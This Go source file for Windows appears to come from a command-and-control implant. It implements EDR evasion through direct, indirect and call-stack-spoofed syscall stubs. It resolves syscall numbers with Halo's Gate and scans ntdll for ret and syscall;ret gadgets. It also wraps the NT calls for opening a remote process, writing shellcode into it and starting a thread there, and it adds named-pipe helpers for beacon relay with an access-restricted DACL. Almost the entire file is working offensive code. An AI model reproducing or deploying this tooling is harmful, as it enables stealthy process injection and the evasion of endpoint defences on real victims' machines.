//go:build windows && !arm64
// +build windows,!arm64

package main

import (
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── Syscall Manager ──
// Caches resolved SSNs and built stubs to avoid re-parsing ntdll on every inject.

type syscallManager struct {
	stubs    map[string]uintptr
	ssnTable *SSNTable // pre-resolved SSN table from disk (nil = scan mapped image at runtime)
}

func newSyscallManager() *syscallManager {
	return &syscallManager{stubs: make(map[string]uintptr)}
}

// setSSNTable injects a pre-resolved SSN table resolved from ntdll on disk at
// startup. When present, stubs use the parsed numbers instead of re-scanning
// the mapped (possibly EDR-patched) image.
func (sm *syscallManager) setSSNTable(table *SSNTable) {
	sm.ssnTable = table
}

// ssnFor returns the syscall number for a name, preferring the pre-resolved
// table (from disk at startup) and falling back to scanning the mapped image.
func (sm *syscallManager) ssnFor(funcName string) (uint16, bool) {
	if sm.ssnTable != nil {
		if ssn, ok := sm.ssnTable.Lookup(funcName); ok {
			return ssn, true
		}
	}
	return 0, false
}

// getStub returns a direct syscall stub (no call stack spoofing).
func (sm *syscallManager) getStub(funcName string) (uintptr, error) {
	if addr, ok := sm.stubs[funcName]; ok {
		return addr, nil
	}
	var ssn uint32
	if s, ok := sm.ssnFor(funcName); ok {
		ssn = uint32(s)
	} else {
		var err error
		ssn, err = findSyscallNumHalo(funcName)
		if err != nil {
			ssn, err = findSyscallNum(funcName)
			if err != nil {
				return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
			}
		}
	}
	code := []byte{
		0x4C, 0x8B, 0xD1, // mov r10, rcx
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24), // mov eax, SSN
		0x0F, 0x05, // syscall
		0xC3, // ret
	}
	addr, err := allocateLocalRX(code)
	if err != nil {
		return 0, fmt.Errorf("alloc %s stub: %w", funcName, err)
	}
	sm.stubs[funcName] = addr
	return addr, nil
}

// getSpoofedStub returns a call-stack-spoofed indirect syscall stub.
// The stub pushes a fake return address (inside ntdll's .text) before
// jumping to the syscall;ret gadget in ntdll, so EDR stack walking
// sees the return originating from ntdll rather than our allocated memory.
func (sm *syscallManager) getSpoofedStub(funcName string) (uintptr, error) {
	cacheKey := "spoofed:" + funcName
	if addr, ok := sm.stubs[cacheKey]; ok {
		return addr, nil
	}

	var ssn uint32
	if s, ok := sm.ssnFor(funcName); ok {
		ssn = uint32(s)
	} else {
		var err error
		ssn, err = findSyscallNumHalo(funcName)
		if err != nil {
			ssn, err = findSyscallNum(funcName)
			if err != nil {
				return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
			}
		}
	}

	// Find syscall;ret gadget in ntdll
	gadget, err := findSyscallGadget()
	if err != nil {
		return 0, err
	}

	// Find a "ret" (0xC3) gadget in ntdll for the fake return address
	fakeRet, err := findRetGadget()
	if err != nil {
		return 0, err
	}

	// Call-stack-spoofed stub:
	//   48 B8 <addr>         mov rax, fake_ret_addr (ntdll ret gadget)
	//   50                    push rax
	//   4C 8B D1              mov r10, rcx
	//   B8 <SSN>              mov eax, SSN
	//   FF 25 00 00 00 00     jmp [rip+0]
	//   <gadget addr>         .quad syscall;ret gadget address
	code := make([]byte, 0, 8+1+3+5+6+8)
	code = append(code, 0x48, 0xB8) // mov rax, imm64
	code = append(code, byte(fakeRet), byte(fakeRet>>8), byte(fakeRet>>16), byte(fakeRet>>24),
		byte(fakeRet>>32), byte(fakeRet>>40), byte(fakeRet>>48), byte(fakeRet>>56))
	code = append(code, 0x50)             // push rax
	code = append(code, 0x4C, 0x8B, 0xD1) // mov r10, rcx
	code = append(code, 0xB8,
		byte(ssn), byte(ssn>>8), byte(ssn>>16), byte(ssn>>24)) // mov eax, SSN
	code = append(code, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00) // jmp [rip+0]
	code = append(code, byte(gadget), byte(gadget>>8), byte(gadget>>16), byte(gadget>>24),
		byte(gadget>>32), byte(gadget>>40), byte(gadget>>48), byte(gadget>>56))

	addr, err := allocateLocalRX(code)
	if err != nil {
		return 0, fmt.Errorf("alloc spoofed %s stub: %w", funcName, err)
	}
	sm.stubs[cacheKey] = addr
	return addr, nil
}

// getIndirectStub returns an indirect syscall stub via a syscall gadget (no spoofing).
func (sm *syscallManager) getIndirectStub(funcName string) (uintptr, error) {
	cacheKey := "indirect:" + funcName
	if addr, ok := sm.stubs[cacheKey]; ok {
		return addr, nil
	}
	var ssn uint32
	if s, ok := sm.ssnFor(funcName); ok {
		ssn = uint32(s)
	} else {
		var err error
		ssn, err = findSyscallNumHalo(funcName)
		if err != nil {
			ssn, err = findSyscallNum(funcName)
			if err != nil {
				return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
			}
		}
	}
	gadget, err := findSyscallGadget()
	if err != nil {
		return 0, err
	}
	code := []byte{
		0x4C, 0x8B, 0xD1, // mov r10, rcx
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24), // mov eax, SSN
		0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [rip+0]
	}
	code = append(code, byte(gadget), byte(gadget>>8), byte(gadget>>16), byte(gadget>>24),
		byte(gadget>>32), byte(gadget>>40), byte(gadget>>48), byte(gadget>>56))

	addr, err := allocateLocalRX(code)
	if err != nil {
		return 0, fmt.Errorf("alloc indirect %s stub: %w", funcName, err)
	}
	sm.stubs[cacheKey] = addr
	return addr, nil
}

func (sm *syscallManager) freeStubs() {
	for name, addr := range sm.stubs {
		procVirtualFree.Call(addr, 0, 0x8000)
		delete(sm.stubs, name)
	}
}

// findRetGadget finds a "ret" (0xC3) instruction in ntdll .text section
// to use as a fake return address for call stack spoofing.
func findRetGadget() (uintptr, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	// Parse ntdll PE headers to locate .text section for gadget scanning
	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	ntHdrOffset := uintptr(dos.eLfanew)
	// Map first section header: located after optional header in NT headers
	firstSection := (*imageSectionHeader)(unsafe.Pointer(base + ntHdrOffset + unsafe.Offsetof(ntHdr.optionalHeader) + uintptr(ntHdr.fileHeader.sizeOfOptionalHeader)))

	// Iterate section headers to find .text section for ret gadget
	for i := uint16(0); i < ntHdr.fileHeader.numberOfSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
		name := string(sec.name[:])
		if name == ".text" {
			start := base + uintptr(sec.virtualAddress)
			size := uintptr(sec.sizeOfRawData)
			if size == 0 {
				size = uintptr(sec.virtualSize)
			}
			if size > 1024*1024 {
				size = 1024 * 1024
			}
			// Map .text section as byte array for 0xC3 (ret) instruction scanning
			text := (*[1 << 20]byte)(unsafe.Pointer(start))[:size]
			// Search for 0xC3 (ret) at a >= 4 byte aligned offset
			for i := 8; i < len(text)-1; i++ {
				if text[i] == 0xC3 && (i%4 == 0) {
					return start + uintptr(i), nil
				}
			}
			// Fallback: any 0xC3
			for i := 0; i < len(text)-1; i++ {
				if text[i] == 0xC3 {
					return start + uintptr(i), nil
				}
			}
		}
	}
	return 0, fmt.Errorf("ret gadget not found in ntdll")
}

// ── Halo's Gate: find SSN with verification ──

func findSyscallNumHalo(funcName string) (uint32, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	// Parse ntdll PE to resolve export and extract syscall number
	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}
	exportDir := &ntHdr.optionalHeader.dataDirectory[0]
	if exportDir.virtualAddress == 0 {
		return 0, fmt.Errorf("no export directory")
	}
	// Map export directory and arrays for function name lookup
	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))

	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
	nameArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfNames)))
	ordArray := (*[1 << 16]uint16)(unsafe.Pointer(base + uintptr(exp.addressOfNameOrdinals)))

	for i := uint32(0); i < exp.numberOfNames; i++ {
		namePtr := base + uintptr(nameArray[i])
		var name string
		for j := 0; ; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			name += string(c)
		}
		if name == funcName {
			ord := ordArray[i]
			funcRVA := funcArray[ord]
			funcAddr := base + uintptr(funcRVA)

			// Read function prologue: scan for "mov eax, SSN" (0xB8) followed by "syscall; ret" (0x0F 0x05 0xC3)
			code := (*[64]byte)(unsafe.Pointer(funcAddr))[:]
			for k := 0; k < len(code)-5; k++ {
				if code[k] == 0xB8 {
					ssn := uint32(code[k+1]) | uint32(code[k+2])<<8 | uint32(code[k+3])<<16 | uint32(code[k+4])<<24
					for j := k + 5; j < len(code)-1 && j <= k+16; j++ {
						if code[j] == 0x0F && code[j+1] == 0x05 {
							if j+2 < len(code) && code[j+2] == 0xC3 {
								return ssn, nil
							}
							continue
						}
					}
					return 0, fmt.Errorf("halo's Gate: valid syscall+ret not found in %s", funcName)
				}
			}
			return 0, fmt.Errorf("halo's Gate: no mov eax pattern in %s", funcName)
		}
	}
	return 0, fmt.Errorf("export %s not found in ntdll", funcName)
}

func findSyscallGadget() (uintptr, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	// Parse ntdll PE to locate "syscall;ret" (0x0F 0x05 0xC3) gadget in .text
	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	ntHdrOffset := uintptr(dos.eLfanew)
	firstSection := (*imageSectionHeader)(unsafe.Pointer(base + ntHdrOffset + unsafe.Offsetof(ntHdr.optionalHeader) + uintptr(ntHdr.fileHeader.sizeOfOptionalHeader)))

	for i := uint16(0); i < ntHdr.fileHeader.numberOfSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
		name := string(sec.name[:])
		if name == ".text" {
			start := base + uintptr(sec.virtualAddress)
			size := uintptr(sec.sizeOfRawData)
			if size == 0 {
				size = uintptr(sec.virtualSize)
			}
			if size > 1024*1024 {
				size = 1024 * 1024
			}
			text := (*[1 << 20]byte)(unsafe.Pointer(start))[:size]
			for i := 0; i < len(text)-2; i++ {
				if text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3 {
					return start + uintptr(i), nil
				}
			}
		}
	}
	return 0, fmt.Errorf("syscall;ret gadget not found in ntdll")
}

// ── High-Level Syscall Wrappers ──
// These wrappers use the spoofed (call-stack-spoofed) stubs by default.

func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr uintptr) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtCreateThreadEx")
	if err != nil {
		// Fallback to direct if spoofed fails
		stub, err = sm.getStub("NtCreateThreadEx")
		if err != nil {
			return 0, err
		}
	}
	var hThread uintptr
	r1, _, _ := syscall.SyscallN(stub,
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF,      // DesiredAccess
		0,             // ObjectAttributes
		hProc,         // ProcessHandle
		shellcodeAddr, // StartAddress
		0,             // Argument
		0,             // CreateFlags
		0,             // ZeroBits
		0,             // StackSize (default)
		0,             // MaxStackSize (default)
		0,             // AttributeList (NULL)
		0,             // padding
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtCreateThreadEx failed: 0x%X", r1)
	}
	return hThread, nil
}

func syscallNtAllocateVirtualMemory(sm *syscallManager, hProc uintptr, size uintptr, protect uint32) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtAllocateVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtAllocateVirtualMemory")
		if err != nil {
			return 0, err
		}
	}
	var baseAddr uintptr
	var regionSize uintptr = size
	r1, _, _ := syscall.SyscallN(stub,
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(memCommit|memReserve),
		uintptr(protect),
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X (size=%d)", r1, size)
	}
	return baseAddr, nil
}

func syscallNtFreeVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uintptr) error {
	stub, err := sm.getSpoofedStub("NtFreeVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtFreeVirtualMemory")
		if err != nil {
			return err
		}
	}
	var regionSize uintptr = 0
	r1, _, _ := syscall.SyscallN(stub,
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(0x8000), // MEM_RELEASE
		0, 0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%X", r1)
	}
	return nil
}

func syscallNtProtectVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uintptr, size uintptr, newProtect uint32) (uint32, error) {
	stub, err := sm.getSpoofedStub("NtProtectVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtProtectVirtualMemory")
		if err != nil {
			return 0, err
		}
	}
	var regionSize uintptr = size
	var oldProtect uint32
	r1, _, _ := syscall.SyscallN(stub,
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
		0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", r1)
	}
	return oldProtect, nil
}

func syscallNtWriteVirtualMemory(sm *syscallManager, hProc uintptr, destAddr uintptr, data []byte) error {
	stub, err := sm.getSpoofedStub("NtWriteVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtWriteVirtualMemory")
		if err != nil {
			return err
		}
	}
	var bytesWritten uintptr
	r1, _, _ := syscall.SyscallN(stub,
		hProc,
		destAddr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
	}
	return nil
}

func syscallNtOpenProcess(sm *syscallManager, desiredAccess uint32, pid uint32) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtOpenProcess")
	if err != nil {
		stub, err = sm.getStub("NtOpenProcess")
		if err != nil {
			return 0, err
		}
	}
	var hProc uintptr
	objAttr := struct {
		length        uint32
		rootDirectory uintptr
		objectName    uintptr
		attributes    uint32
		securityDescr uintptr
		securityQoS   uintptr
	}{}
	objAttr.length = uint32(unsafe.Sizeof(objAttr))

	r1, _, _ := syscall.SyscallN(stub,
		uintptr(unsafe.Pointer(&hProc)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(pid),
		0, 0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtOpenProcess failed: 0x%X", r1)
	}
	return hProc, nil
}

func syscallNtClose(sm *syscallManager, handle uintptr) error {
	stub, err := sm.getSpoofedStub("NtClose")
	if err != nil {
		stub, err = sm.getStub("NtClose")
		if err != nil {
			return err
		}
	}
	r1, _, _ := syscall.SyscallN(stub, handle, 0, 0)
	if r1 != 0 {
		return fmt.Errorf("NtClose failed: 0x%X", r1)
	}
	return nil
}

// syscallNtDelayExecution resolves NtDelayExecution once and calls it.
// delayInterval is in 100-ns units; negative = relative wait.
// Returns true if the wait was satisfied, false if alertable and APC delivered.
func syscallNtDelayExecution(sm *syscallManager, alertable bool, delayInterval *int64) (bool, error) {
	stub, err := sm.getSpoofedStub("NtDelayExecution")
	if err != nil {
		stub, err = sm.getStub("NtDelayExecution")
		if err != nil {
			return false, err
		}
	}
	alert := uintptr(0)
	if alertable {
		alert = 1
	}
	r1, _, _ := syscall.SyscallN(stub,
		alert,
		uintptr(unsafe.Pointer(delayInterval)),
		0,
	)
	// STATUS_SUCCESS = 0, STATUS_USER_APC = 0xC0 (alertable wait interrupted)
	return r1 == 0, nil
}

// ── Named Pipe NT Syscall Helpers ──
// These use the existing syscallManager to build direct syscall stubs for
// NtCreateNamedPipeFile, NtOpenFile, NtReadFile, NtWriteFile, and NtFsControlFile.

// NT API structs for named pipe operations.
type ntUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type ntObjectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *ntUnicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type ntIoStatusBlock struct {
	Status      uintptr
	Information uintptr
}

// ntPipeNameToNtPath converts "pipename" to the NT namespace path \??\pipe\pipename
// and returns a properly initialized ntUnicodeString backed by the provided buffer.
func ntBuildPipeName(pipeName string) (*uint16, *ntUnicodeString) {
	ntPath := `\??\pipe\` + pipeName
	buf, _ := syscall.UTF16FromString(ntPath)
	// buf includes null terminator, Length excludes it
	length := uint16(len(buf)-1) * 2 // bytes excluding null
	maxLen := uint16(len(buf)) * 2   // bytes including null
	us := &ntUnicodeString{
		Length:        length,
		MaximumLength: maxLen,
		Buffer:        &buf[0],
	}
	return &buf[0], us
}

// ntBuildObjAttr builds a complete OBJECT_ATTRIBUTES for a named pipe path.
// secDesc is the (optional) SECURITY_DESCRIPTOR pointer restricting pipe
// access; pass 0 to use the default (process) DACL.
func ntBuildObjAttr(pipeName string, secDesc uintptr) (*uint16, *ntUnicodeString, *ntObjectAttributes) {
	buf, us := ntBuildPipeName(pipeName)
	oa := &ntObjectAttributes{
		Length:             uint32(unsafe.Sizeof(ntObjectAttributes{})),
		ObjectName:         us,
		Attributes:         0x40, // objCaseInsensitive
		SecurityDescriptor: secDesc,
	}
	return buf, us, oa
}

// ntBuildRestrictedPipeSD builds a SECURITY_DESCRIPTOR whose DACL grants only
// the agent's own token SID FILE_READ_DATA|FILE_WRITE_DATA on the named pipe.
// This stops other local principals (including admins) from connecting to the
// parent relay pipe to claim child UUIDs or observe relay traffic (B1).
// Returns nil (and the caller falls back to the default DACL) if it cannot be
// built, so the relay is never broken by an unexpected error.
func ntBuildRestrictedPipeSD() *windows.SECURITY_DESCRIPTOR {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
		return nil
	}
	defer tok.Close()

	var sidLen uint32
	if err := windows.GetTokenInformation(tok, windows.TokenUser, nil, 0, &sidLen); err != nil {
		return nil
	}
	buf := make([]byte, sidLen)
	if err := windows.GetTokenInformation(tok, windows.TokenUser, &buf[0], sidLen, &sidLen); err != nil {
		return nil
	}
	tu := (*windows.Tokenuser)(unsafe.Pointer(&buf[0]))
	sid := (*windows.SID)(unsafe.Pointer(tu.User.Sid))

	sd, err := windows.NewSecurityDescriptor()
	if err != nil {
		return nil
	}
	ea := []windows.EXPLICIT_ACCESS{{
		AccessPermissions: windows.FILE_READ_DATA | windows.FILE_WRITE_DATA,
		AccessMode:        windows.GRANT_ACCESS,
		Trustee: windows.TRUSTEE{
			TrusteeForm:  windows.TRUSTEE_IS_SID,
			TrusteeType:  windows.TRUSTEE_IS_USER,
			TrusteeValue: windows.TrusteeValueFromSID(sid),
		},
	}}
	dacl, err := windows.ACLFromEntries(ea, nil)
	if err != nil {
		return nil
	}
	if err := sd.SetDACL(dacl, true, false); err != nil {
		return nil
	}
	// NtCreateNamedPipeFile expects a self-relative SECURITY_DESCRIPTOR, but
	// NewSecurityDescriptor returns an absolute one; convert it.
	selfRel, err := sd.ToSelfRelative()
	if err != nil {
		return nil
	}
	return selfRel
}

// syscallNtCreateNamedPipeFile creates the server end of a named pipe.
// Returns the pipe handle on success.
func syscallNtCreateNamedPipeFile(sm *syscallManager, pipeName string, maxInstances uint32) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtCreateNamedPipeFile")
	if err != nil {
		stub, err = sm.getStub("NtCreateNamedPipeFile")
		if err != nil {
			return 0, fmt.Errorf("NtCreateNamedPipeFile stub: %w", err)
		}
	}

	// Default timeout: 5 seconds expressed as negative 100ns intervals (relative)
	var timeout int64 = -5 * 10000000 // 5 seconds in 100ns units, negative = relative

	// Issue NtCreateNamedPipeFile with the given OBJECT_ATTRIBUTES.
	createOnce := func(oa *ntObjectAttributes) (uintptr, uintptr) {
		var iosb ntIoStatusBlock
		var handle uintptr
		r1, _, _ := syscall.SyscallN(stub,
			uintptr(unsafe.Pointer(&handle)),  // FileHandle (out)
			0xC0000000,                        // DesiredAccess: GENERIC_READ | GENERIC_WRITE
			uintptr(unsafe.Pointer(oa)),       // ObjectAttributes
			uintptr(unsafe.Pointer(&iosb)),    // IoStatusBlock (out)
			3,                                 // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
			3,                                 // CreateDisposition: FILE_OPEN_IF
			0x20,                              // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT
			0,                                 // NamedPipeType: FILE_PIPE_BYTE_STREAM_TYPE
			0,                                 // ReadMode: FILE_PIPE_BYTE_STREAM_MODE
			0,                                 // CompletionMode: FILE_PIPE_QUEUE_OPERATION
			uintptr(maxInstances),             // MaximumInstances
			4096,                              // InboundQuota
			4096,                              // OutboundQuota
			uintptr(unsafe.Pointer(&timeout)), // DefaultTimeout
			0,
		)
		return handle, r1
	}

	// Restrict the relay pipe to the agent's own token SID so other local
	// principals cannot connect to it and claim child UUIDs / observe relay
	// traffic (B1). Fall back to the default DACL if the restricted SD cannot
	// be built or is rejected, so the relay still comes up.
	sd := ntBuildRestrictedPipeSD()
	_, _, oa := ntBuildObjAttr(pipeName, uintptr(unsafe.Pointer(sd)))
	defer runtime.KeepAlive(sd)

	handle, r1 := createOnce(oa)
	if r1 != 0 && sd != nil {
		// Restricted DACL rejected — retry once with the default DACL.
		_, _, oaDef := ntBuildObjAttr(pipeName, 0)
		handle, r1 = createOnce(oaDef)
	}
	if r1 != 0 {
		return 0, fmt.Errorf("NtCreateNamedPipeFile failed: 0x%X", r1)
	}
	return handle, nil
}

// syscallNtOpenPipe opens the client end of a named pipe.
func syscallNtOpenPipe(sm *syscallManager, pipeName string) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtOpenFile")
	if err != nil {
		stub, err = sm.getStub("NtOpenFile")
		if err != nil {
			return 0, fmt.Errorf("NtOpenFile stub: %w", err)
		}
	}

	_, _, oa := ntBuildObjAttr(pipeName, 0)
	var iosb ntIoStatusBlock
	var handle uintptr

	r1, _, _ := syscall.SyscallN(stub,
		uintptr(unsafe.Pointer(&handle)), // FileHandle (out)
		0xC0000000,                       // DesiredAccess: GENERIC_READ | GENERIC_WRITE
		uintptr(unsafe.Pointer(oa)),      // ObjectAttributes
		uintptr(unsafe.Pointer(&iosb)),   // IoStatusBlock (out)
		3,                                // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
		0x20,                             // OpenOptions: FILE_SYNCHRONOUS_IO_NONALERT
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtOpenFile pipe failed: 0x%X", r1)
	}
	return handle, nil
}

// syscallNtFsControlListen sends FSCTL_PIPE_LISTEN to wait for a client connection.
// Blocks until a client connects.
func syscallNtFsControlListen(sm *syscallManager, handle uintptr) error {
	stub, err := sm.getSpoofedStub("NtFsControlFile")
	if err != nil {
		stub, err = sm.getStub("NtFsControlFile")
		if err != nil {
			return fmt.Errorf("NtFsControlFile stub: %w", err)
		}
	}

	var iosb ntIoStatusBlock

	r1, _, _ := syscall.SyscallN(stub,
		handle,                         // FileHandle
		0,                              // Event (none, synchronous)
		0,                              // ApcRoutine
		0,                              // ApcContext
		uintptr(unsafe.Pointer(&iosb)), // IoStatusBlock (out)
		0x110004,                       // FsControlCode: FSCTL_PIPE_LISTEN
		0,                              // InputBuffer
		0,                              // InputBufferLength
		0,                              // OutputBuffer
		0,                              // OutputBufferLength
		0, 0,
	)
	if r1 != 0 && r1 != 0x103 { // STATUS_SUCCESS or STATUS_PENDING
		return fmt.Errorf("NtFsControlFile LISTEN failed: 0x%X", r1)
	}
	return nil
}

// syscallNtReadPipe reads from a pipe handle into buf. Returns bytes read.
func syscallNtReadPipe(sm *syscallManager, handle uintptr, buf []byte) (int, error) {
	stub, err := sm.getSpoofedStub("NtReadFile")
	if err != nil {
		stub, err = sm.getStub("NtReadFile")
		if err != nil {
			return 0, fmt.Errorf("NtReadFile stub: %w", err)
		}
	}

	if len(buf) == 0 {
		return 0, nil
	}

	var iosb ntIoStatusBlock

	r1, _, _ := syscall.SyscallN(stub,
		handle,                           // FileHandle
		0,                                // Event
		0,                                // ApcRoutine
		0,                                // ApcContext
		uintptr(unsafe.Pointer(&iosb)),   // IoStatusBlock (out)
		uintptr(unsafe.Pointer(&buf[0])), // Buffer
		uintptr(len(buf)),                // Length
		0,                                // ByteOffset (nil for pipes)
		0,                                // Key
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtReadFile failed: 0x%X", r1)
	}
	return int(iosb.Information), nil
}

// syscallNtWritePipe writes data to a pipe handle. Returns bytes written.
func syscallNtWritePipe(sm *syscallManager, handle uintptr, data []byte) (int, error) {
	stub, err := sm.getSpoofedStub("NtWriteFile")
	if err != nil {
		stub, err = sm.getStub("NtWriteFile")
		if err != nil {
			return 0, fmt.Errorf("NtWriteFile stub: %w", err)
		}
	}

	if len(data) == 0 {
		return 0, nil
	}

	var iosb ntIoStatusBlock

	r1, _, _ := syscall.SyscallN(stub,
		handle,                            // FileHandle
		0,                                 // Event
		0,                                 // ApcRoutine
		0,                                 // ApcContext
		uintptr(unsafe.Pointer(&iosb)),    // IoStatusBlock (out)
		uintptr(unsafe.Pointer(&data[0])), // Buffer
		uintptr(len(data)),                // Length
		0,                                 // ByteOffset (nil for pipes)
		0,                                 // Key
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtWriteFile failed: 0x%X", r1)
	}
	return int(iosb.Information), nil
}

// syscallNtCloseHandle wraps NtClose via syscall stubs.
func syscallNtCloseHandle(sm *syscallManager, handle uintptr) error {
	return syscallNtClose(sm, handle)
}

// getSyscallManagerForPipe returns a shared syscall manager for named pipe operations.
// Uses a package-level singleton so we don't have to re-resolve SSNs on every beacon.
var pipeSyscallManager *syscallManager
var pipeSyscallManagerInit bool

func getPipeSyscallManager() *syscallManager {
	if !pipeSyscallManagerInit {
		pipeSyscallManager = newSyscallManager()
		pipeSyscallManagerInit = true
	}
	return pipeSyscallManager
}
